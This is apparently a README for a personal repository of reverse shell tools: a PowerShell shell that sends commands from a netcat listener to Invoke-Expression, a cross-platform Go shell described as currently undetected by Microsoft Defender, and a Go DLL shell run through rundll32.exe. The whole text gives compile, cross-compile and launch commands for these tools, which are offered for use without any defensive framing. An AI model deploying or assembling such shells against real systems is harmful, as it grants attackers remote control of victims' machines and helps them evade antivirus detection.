# My Reverse Shells

# Powershell
Native PowerShell reverse shell to a netcat listener.

Supports commands up to 16384 bytes in length, if you need longer than modify the line where the System.Byte[] object is declared.

This passes all commands entered from the netcat listener to PowerShell's Invoke-Expression, so this supports powershell + cmd.exe commands. Errors are sent over the socket

Usage:

<code>./pwsh_revshell.ps1 -ip 127.0.0.1 -port 3333 </code>


# Golang

Golang reverse shell. Does runtime OS detection and selects proper shell for Windows, Mac, and Linux. Is not detected currently by Microsoft Defender.
To Compile:

Linux:

<code>go build  -ldflags="-s -w" -o revshell revshell.go</code>

Cross compile on Linux for Windows:

<code>GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o revshell.exe revshell.go</code>

To run, provide the IP address and port as command line arguments:

<code>./revshell 127.0.0.1 3333</code>

<code>revshell.exe 127.0.0.1 3333</code>



# Golang DLL Reverse Shell

Golang DLL reverse shell designed to be run with rundll32.exe. This currently has the IP and port hardcoded. Modify the IP and port in the source code.
To Compile:

Linux:
You will need to install the following packages on Ubuntu

<code>sudo apt install golang gcc build-essential gcc-mingw-w64-x86-64 gcc-mingw-w64-i686</code>


Cross compile on Linux for Windows:


32 bit DLL

<code>env GOOS=windows GOARCH=386 CGO_ENABLED=1 CC=i686-w64-mingw32-gcc go build -ldflags="-s -w" -buildmode=c-shared -o revshell32.dll revshell_dll.go</code>


64 bit DLL


<code>env GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -ldflags="-s -w" -buildmode=c-shared -o revshell64.dll revshell_dll.go</code>

To run:

<code>rundll32.exe C:\revshell32.dll,Entry</code>
